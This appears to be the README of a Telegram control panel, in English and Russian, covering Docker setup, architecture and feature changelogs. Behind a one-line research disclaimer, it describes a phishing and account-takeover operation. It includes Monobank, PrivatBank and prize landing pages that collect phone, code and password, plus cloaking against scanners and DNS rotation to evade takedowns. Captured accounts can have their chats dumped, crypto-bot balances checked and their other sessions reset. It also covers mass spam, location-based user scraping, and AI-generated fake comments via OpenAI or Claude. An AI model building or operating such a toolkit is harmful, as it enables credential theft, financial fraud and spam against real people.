# Main – Telegram Panel

> **⚠️ For authorized security research only. Do not use on real users without consent.**

## Quick Start (Docker)

### 1. Copy and configure environment

```bash
# Clone the repository and enter the application directory:
git clone https://github.com/castawayGG/Ameba.git
cd Ameba/webapptest

cp .env.example .env
# Edit .env and set all required values
```

**Required variables in `.env`:**

| Variable | Description |
|---|---|
| `SECRET_KEY` | Long random string (use `python -c "import secrets; print(secrets.token_hex(32))"`) |
| `POSTGRES_PASSWORD` | Strong Postgres password |
| `TG_API_ID` / `TG_API_HASH` | From https://my.telegram.org/apps (fallback if no DB credentials) |
| `ADMIN_USERNAME` | Initial admin login |
| `ADMIN_PASSWORD_HASH` | bcrypt hash (see below) |
| `SESSION_ENCRYPTION_KEY` | Fernet key (see below) |
| `NOTIFICATION_BOT_TOKEN` | (Optional) Telegram bot token for login alerts |
| `NOTIFICATION_CHAT_ID` | (Optional) Telegram chat ID to receive alerts |
| `RATE_LIMIT_LOGIN` | (Optional) Login rate limit, e.g. `10 per minute` |
| `RATE_LIMIT_API` | (Optional) API rate limit, e.g. `60 per minute` |
| `PROXY_REFRESH_HOURS` | (Optional) Hours between auto proxy refresh (default: 6) |

**Generate password hash:**
```bash
python -c "import bcrypt; print(bcrypt.hashpw(b'yourpassword', bcrypt.gensalt()).decode())"
```

**Generate Fernet encryption key:**
```bash
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
```

### 2. Build and run (one command)

```bash
# (inside Ameba/webapptest — already there from step 1)
./start.sh          # build images and start all services
```

Or with Make:

```bash
make start
```

Other commands:

```bash
./start.sh stop     # stop all services
./start.sh restart  # rebuild and restart
./start.sh logs     # follow logs
./start.sh status   # show container status
```

> **Note:** By default the setup uses HTTP (port 80) for local development.
> For production with HTTPS, replace `nginx/dev.conf` with `nginx/default.conf`
> in `docker-compose.yml`, set your domain name and point `/etc/letsencrypt`
> to your Let's Encrypt certificates.

Services started:
- **web** – Flask/Gunicorn app (port 8000, behind Nginx)
- **nginx** – Reverse proxy (port 80; HTTP by default)
- **postgres** – PostgreSQL database
- **redis** – Redis (Celery broker + rate limiter backend)
- **celery_worker** – Celery worker for background tasks
- **celery_beat** – Celery beat scheduler
- **flower** – Celery monitoring UI (port 5555)
- **prometheus** / **loki** / **grafana** – Observability stack

### 3. Access the admin panel

Navigate to `http://localhost/admin`.

## Local Development (without Docker)

```bash
# (inside Ameba/webapptest)
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

export DATABASE_URL=sqlite:///data.db
export SECRET_KEY=dev-only-key
export TG_API_ID=0
export TG_API_HASH=dev

python run.py
```

## Running Tests

```bash
# (inside Ameba/webapptest)
pip install pytest
python -m pytest tests/ -v
```

## Database Migrations

```bash
# Inside the webapptest directory with DATABASE_URL set:
alembic upgrade head

# Auto-generate a new migration after model changes:
alembic revision --autogenerate -m "describe change"
```

## Architecture

```
webapptest/
├── web/               # Flask app
│   ├── app.py         # Application factory (create_app)
│   ├── extensions.py  # SQLAlchemy, LoginManager, Limiter, Migrate
│   ├── routes/        # Blueprints: public, admin, api
│   ├── middlewares/   # Auth (admin/editor/viewer roles), IP whitelist, rate limit
│   └── templates/     # Jinja2 templates (dark blue theme)
├── models/            # SQLAlchemy models
│   ├── account_log.py # Per-account action history
│   └── api_credential.py # API ID/Hash pairs for rotation
├── services/          # Business logic (telegram, proxy, backup, export)
│   └── telegram/
│       └── credentials.py # Random API credential rotation
├── tasks/             # Celery tasks
│   ├── session_checker.py   # Mass session validity + auto re-login
│   └── proxy_autoloader.py  # Auto-load free proxies from public sources
├── core/              # Config, database, logger, exceptions
├── utils/             # Encryption, helpers, validators
├── alembic/           # Database migrations
├── nginx/             # Nginx config
├── Dockerfile
├── docker-compose.yml
└── requirements.txt
```

## New Features

### Dark Blue Admin UI
The admin panel uses a dark blue palette (#0a1929, #1e2f4f, #2563eb) with dark mode enabled by default. FontAwesome icons are used throughout.

### Role-Based Access
Three roles are supported: `superadmin` (full access), `admin`/`editor` (read-write), `viewer` (read-only). The `viewer` role is blocked from all mutating actions.

### Server Monitoring (`/admin/monitoring`)
- Live CPU/RAM/Disk metrics refreshed every 7 seconds via AJAX
- Overload warnings (>80% CPU, >90% RAM)
- Version info: Python, Flask, SQLAlchemy, Telethon, last git commit

### API Credential Rotation (`/admin/settings/api_credentials`)
- Store multiple Telegram API ID/Hash pairs
- Each request randomly selects an active pair from the database
- CRUD interface with toggle/enable/disable

### Account Health Status
The accounts table shows color-coded status indicators:
- 🟢 Green = active
- 🟡 Yellow = 2FA required
- 🔴 Red = banned/deactivated
- ⚫ Gray = expired/inactive

### Account Activity History
Click the clock icon on any account to view its full action log (session checks, messages sent, re-login attempts, etc.) with timestamp, result, initiator, and IP.

### Session Validity Checks
- Per-account: click the shield icon to trigger a Celery task
- Mass check: "Check all sessions" button in the accounts header
- Automated: scheduled every `PROXY_REFRESH_HOURS` hours via Celery Beat
- Auto re-login: attempted automatically for expired sessions

### Automatic Proxy Loading
- Click "Auto-Load" on the proxies page to fetch from public PROXY-List repositories
- New proxies are queued for validation automatically
- Scheduled via Celery Beat every `PROXY_REFRESH_HOURS` hours

### Telegram Bot Alerts
Set `NOTIFICATION_BOT_TOKEN` and `NOTIFICATION_CHAT_ID` in `.env` to receive a Telegram message on every admin login event.

## Security Notes

- Admin panel is protected by Flask-Login + rate limiting + optional IP whitelist.
- Set `IP_WHITELIST` in `.env` to restrict admin access by IP (bypasses rate limits).
- All Telegram session data is encrypted using Fernet symmetric encryption.
- Nginx passes real client IPs via `X-Real-IP` / `X-Forwarded-For`; the app uses `ProxyFix` to read them correctly.
- Admin login events are logged to the database and optionally sent as Telegram bot alerts.
- API credentials (API ID/Hash) are stored in the database and never written to environment files.
- Never commit `.env` or any file with real secrets.

---

## Новый функционал: 7 тематических блоков

### Блок 1: Автоматизация аккаунтов (Фарминг и Прогрев)

**Страница:** `/admin/ai_farming`

- **AI Генерация комментариев** (`services/ai/comment_generator.py`)  
  Интеграция с OpenAI (GPT-3.5/4) и Claude (Anthropic) для генерации реалистичных комментариев на основе текста поста.  
  Настраивается через `/admin/api/ai/settings`. Поддерживает стили: позитивный, нейтральный, вопрос, с эмодзи.  
  При отключённом AI или ошибке сети — автоматически использует встроенные fallback-шаблоны.

- **Генератор личностей** (`services/accounts/personality.py`)  
  Создаёт реалистичные профили: случайное имя из пула (RU/EN), биография из шаблонов, аватар с сервиса ThisPersonDoesNotExist.  
  Применяется к аккаунту через кнопку в интерфейсе — обновляет имя, биографию и фото профиля.

- **Имитация набора текста** (`simulate_typing` в `services/telegram/actions.py`)  
  Отправляет `typing...` action в указанный чат на заданное количество секунд.

- **Реакции на посты** (`react_to_message` в `services/telegram/actions.py`)  
  Ставит эмодзи-реакцию на любое сообщение в канале/группе.

### Блок 2: Массовые спам-кампании

**API эндпоинты:** `/admin/api/campaigns/`

- **Рассылка голосовых сообщений** (`send_voice_message`)  
  Отправляет OGG/OPUS аудиофайл как голосовое сообщение через указанный аккаунт.

- **Рассылка кружков (video notes)** (`send_video_note`)  
  Отправляет квадратный MP4 как Telegram-кружок через указанный аккаунт.

- **Инвайтинг пользователей в группу** (`invite_users_to_group`)  
  Пакетный инвайт списка пользователей в группу/канал с задержками для обхода флуд-контроля.

### Блок 3: Парсинг аудитории

**Расширения к существующему парсеру:**

- **Парсер комментаторов каналов** (`parse_channel_commenters`)  
  POST `/admin/api/parser/channel_commenters` — парсит уникальных авторов комментариев из Discussion-группы канала.

- **Гео-парсер** (`parse_geo_users`)  
  POST `/admin/api/parser/geo` — ищет пользователей по координатам (GetLocated API Telegram).

- **Lookalike алгоритм** (`apply_lookalike_filter`)  
  POST `/admin/api/parser/<id>/lookalike` — находит пересечение двух баз, выявляя "горячих лидов".

- **Скраббинг базы** (`scrub_user_base`)  
  POST `/admin/api/parser/<id>/scrub` — удаляет ботов, пользователей без username/фото по заданным критериям.

### Блок 4: Фишинг, Лендинги и Перехват

- **Cloudflare Turnstile** (`web/routes/public.py::_verify_turnstile_token`)  
  Функция верификации токена через Cloudflare Turnstile API.  
  Публичный ключ отдаётся лендингам через `/api/captcha_config`.  
  Настройка: `TURNSTILE_SITE_KEY`, `TURNSTILE_SECRET_KEY` в `.env`.

- **Клоакинг** (`web/middlewares/cloaking.py`, страница `/admin/cloaking`)  
  Определяет ботов/сканеров по User-Agent и заблокированным IP.  
  Управление через `/admin/api/cloaking/settings`. Включается через настройки панели.

- **DNS Ротация доменов** (`services/dns/manager.py`, страница `/admin/dns`)  
  Автоматически меняет A-запись домена через Cloudflare DNS API.  
  Настройка: `cloudflare_token`, `cloudflare_zone_id` в настройках панели.

- **Проверка баланса крипто-ботов** (`services/crypto/balance.py`)  
  POST `/admin/api/crypto/balance` — отправляет `/balance` крипто-боту и парсит ответ.  
  Поддерживает @CryptoBot, @send, @wallet.

### Блок 5: Безопасность и инфраструктура

- **Ротация мобильных прокси через API** (`models/proxy.py::rotation_url`)  
  Новое поле `rotation_url` в модели Proxy — URL для смены IP у мобильного прокси-провайдера.  
  POST `/admin/api/proxies/<id>/rotate_mobile` — вызывает URL ротации одним кликом.

### Блок 6: Telegram-управление

- **Сброс всех сессий** (`reset_all_sessions` в `services/telegram/actions.py`)  
  POST `/admin/api/accounts/<id>/reset_sessions` — завершает все авторизованные сессии кроме текущей.

- **Дамп чатов** (`dump_all_chats` в `services/telegram/actions.py`)  
  POST `/admin/api/accounts/<id>/dump_chats` — создаёт ZIP-архив со всеми чатами аккаунта в текстовом формате.

### Блок 7: Интеграции и уведомления

**Страница:** `/admin/reports`

- **HTML/PDF отчёты** (`services/export/pdf_report.py`)  
  GET `/admin/api/reports/generate` — генерирует HTML-отчёт со статистикой системы (аккаунты, кампании, прокси).

- **Отправка отчётов в Telegram** (`tasks/scheduled_reports.py`)  
  POST `/admin/api/reports/send_now` — немедленная отправка отчёта через Telegram-бот.  
  POST `/admin/api/reports/send_excel` — отправка Excel-таблицы аккаунтов.  
  Задача Celery `tasks.generate_and_send_report` для расписания через Celery Beat.

### Конфигурация новых функций

Все новые функции деактивируемы через переменные окружения или настройки панели (`/admin/settings`):

| Функция | Env / PanelSettings ключ |
|---------|--------------------------|
| AI генерация | `AI_ENABLED`, `ai_provider`, `openai_api_key`, `claude_api_key` |
| Клоакинг | `CLOAKING_ENABLED`, `cloaking_enabled` |
| DNS ротация | `DNS_ROTATION_ENABLED`, `dns_enabled` |
| Turnstile | `TURNSTILE_SITE_KEY`, `TURNSTILE_SECRET_KEY` |
| Уведомления | `NOTIFICATION_BOT_TOKEN`, `NOTIFICATION_CHAT_ID` |

---

## Исправления и улучшения (PR: Доработка по требованиям)

### Критические исправления

#### 1. Ошибка `'Query' object has no attribute 'scalars'` (#9)
**Файл:** `services/telegram/event_listener.py`  
**Проверка:** Запустить event listener (`tasks/telegram_listener.py`) — ошибка `AttributeError: 'Query' object has no attribute 'scalars'` больше не появляется в логах при переподключении к аккаунтам.

#### 2. Ошибка отправки сообщений из Входящих (#3)
**Файлы:** `services/telegram/actions.py`, `web/routes/admin.py`  
**Проверка:**
- Перейти в `/admin/inbox`, открыть чат (в т.ч. с отрицательным chat_id — группы/каналы).
- Ввести текст и нажать «Отправить» — сообщение должно отправиться без ошибки Telethon entity.
- URL теперь использует `<path:chat_id>` вместо `<int:chat_id>`, что поддерживает отрицательные ID.

#### 3. Отображение времени сообщений (#6)
**Файл:** `web/templates/admin/inbox.html`  
**Проверка:** Время в диалогах и в открытых чатах показывается как «0с», «5м», «2ч» — без отрицательных значений. Поддерживает ISO-строки с и без `Z`/timezone offset.

#### 4. Method Not Allowed в Отчётах (#12)
**Файл:** `web/templates/admin/reports.html`  
**Проверка:**
- Перейти в `/admin/reports`.
- Нажать «Скачать отчёт» — отчёт скачается (JavaScript делает POST-запрос).
- «Скачать Excel» и «Скачать CSV» ведут на `/admin/export/accounts` и `/admin/export/accounts/csv` — корректные маршруты.

#### 5. Быстрые ответы со Spintax (#10)
**Файл:** `web/templates/admin/inbox.html`  
**Проверка:**
- В `/admin/quick-replies` создать шаблон с текстом: `Привет, {дружище|товарищ|брат}!`
- Открыть чат во Входящих → нажать иконку быстрых ответов → выбрать шаблон.
- Каждый раз в поле ввода будет вставляться случайный вариант: «Привет, дружище!», «Привет, товарищ!» или «Привет, брат!».

#### 6. Проверка связки API ID + API Hash (#13)
**Файлы:** `web/routes/admin.py`, `web/templates/admin/api_credentials.html`  
**Проверка:**
- Перейти в `/admin/settings/api_credentials`.
- Нажать кнопку «✅» (Проверить) рядом с любой парой API ID/Hash.
- Появится тост: «✅ Связка API ID/Hash — рабочая» или «⚠️ Связка недоступна».

#### 7. Отображение изображений во Входящих (#4)
**Файлы:** `web/routes/admin.py`, `web/templates/admin/inbox.html`  
**Проверка:**
- Открыть чат во Входящих, содержащий медиа-сообщение (фото).
- Фотографии отображаются как `<img>` теги с загрузкой через `/admin/accounts/<id>/media/<msg_id>`.
- Другие типы медиа (документы, видео) отображаются с иконкой типа.

#### 8. Реалтайм обновление Входящих (#1, #2)
**Файл:** `web/templates/admin/inbox.html`  
**Проверка:**
- Открыть `/admin/inbox` в браузере.
- WebSocket `/ws/notifications` подключается автоматически.
- При получении нового сообщения список диалогов и открытые колонки обновляются автоматически.
- Polling-интервал 15 секунд также обновляет открытые чат-колонки.

#### 9. Уведомление бота при смене оператора (#7)
**Файл:** `web/routes/admin.py`  
**Проверка:**
- Открыть чат → нажать кнопку «Передать оператору» → выбрать оператора.
- В Telegram-бот придёт сообщение: «🔄 Смена оператора» с именами операторов, аккаунтом и chat_id.

#### 10. Фильтрация по контактам (#11)
**Файл:** `web/templates/admin/inbox.html`  
**Проверка:**
- В `/admin/inbox` нажать кнопку «Контакты» в левой панели.
- Список диалогов покажет только сообщения от пользователей с известным именем или username.

#### 11. Новые шаблоны лендингов (#8)
**Файл:** `services/landing_templates.py`  
**Проверка:**
- Запустить скрипт `python scripts/seed_landings.py`.
- В `/admin/landings` появятся 3 новых шаблона: **Monobank**, **ПриватБанк**, **Приз 5000 грн**.
- Каждый шаблон содержит форму телефона → код → пароль → успех.

### Запуск тестов для проверки исправлений

```bash
cd webapptest
python -m pytest tests/test_fixes.py -v
```

Все 25 тестов должны пройти успешно.
